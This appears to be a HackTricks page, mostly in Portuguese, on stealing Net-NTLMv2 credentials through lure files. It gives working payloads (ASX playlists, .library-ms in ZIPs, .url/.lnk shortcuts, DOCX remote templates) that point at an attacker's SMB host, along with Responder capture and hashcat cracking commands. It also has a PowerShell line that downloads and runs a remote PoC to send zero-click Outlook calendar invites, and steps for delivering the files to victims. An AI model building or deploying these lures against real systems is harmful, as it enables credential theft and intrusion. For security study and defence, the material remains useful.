# Locais para roubar credenciais NTLM

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias em [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde o download de um arquivo Microsoft Word online até a ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Playlists do Windows Media Player (.ASX/.WAX)

Se você conseguir fazer com que um alvo abra ou pré-visualize uma playlist do Windows Media Player que você controla, você pode leak Net‑NTLMv2 apontando a entrada para um UNC path. O WMP tentará buscar a mídia referenciada via SMB e autenticará implicitamente.

Exemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Fluxo de coleta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

O Windows Explorer trata de forma insegura arquivos .library-ms quando são abertos diretamente de dentro de um arquivo ZIP. Se a definição da biblioteca apontar para um caminho UNC remoto (ex.: \\attacker\share), simplesmente navegar/abrir o .library-ms dentro do ZIP faz com que o Explorer enumere o UNC e emita autenticação NTLM para o atacante. Isso gera um NetNTLMv2 que pode ser crackeado offline ou potencialmente relayed.

Exemplo mínimo de .library-ms apontando para um UNC do atacante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Crie o arquivo .library-ms com o XML acima (set your IP/hostname).
- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
- Execute um NTLM capture listener e aguarde que a vítima abra o .library-ms de dentro do ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processava a propriedade MAPI estendida PidLidReminderFileParameter em itens de calendário. Se essa propriedade apontava para um caminho UNC (e.g., \\attacker\share\alert.wav), o Outlook contatava o share SMB quando o lembrete disparava, causando o leak do Net‑NTLMv2 do usuário sem qualquer clique. Isso foi patched em 14 de março de 2023, mas ainda é altamente relevante para frotas legadas/sem atualização e para resposta a incidentes históricos.

Exploração rápida com PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado do Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- A vítima apenas precisa ter Outlook for Windows em execução quando o lembrete for acionado.
- O leak gera Net‑NTLMv2 adequado para offline cracking ou relay (não pass‑the‑hash).


### .LNK/.URL baseado em ícone zero‑click NTLM leak (CVE‑2025‑50154 – bypass de CVE‑2025‑24054)

Windows Explorer renderiza automaticamente ícones de atalho. Pesquisas recentes mostraram que, mesmo após o patch de abril de 2025 da Microsoft para atalhos UNC‑icon, ainda era possível acionar a autenticação NTLM sem cliques hospedando o alvo do atalho em um caminho UNC e mantendo o ícone local (o bypass do patch recebeu a designação CVE‑2025‑50154). Apenas visualizar a pasta faz com que o Explorer recupere metadados do alvo remoto, emitindo NTLM para o servidor SMB do atacante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de atalho de programa (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Coloque o shortcut em um ZIP e faça a vítima navegar por ele.
- Coloque o shortcut em um share gravável que a vítima vá abrir.
- Combine com outros lure files na mesma pasta para que o Explorer pré-visualize os itens.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edite word/settings.xml e adicione a referência do template anexado:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edite word/_rels/settings.xml.rels e aponte rId1337 para o seu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempacote para .docx e entregue. Execute seu SMB capture listener e aguarde a abertura.

Para ideias pós-captura sobre relaying ou abuso de NTLM, consulte:

{{#ref}}
README.md
{{#endref}}


## Referências
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
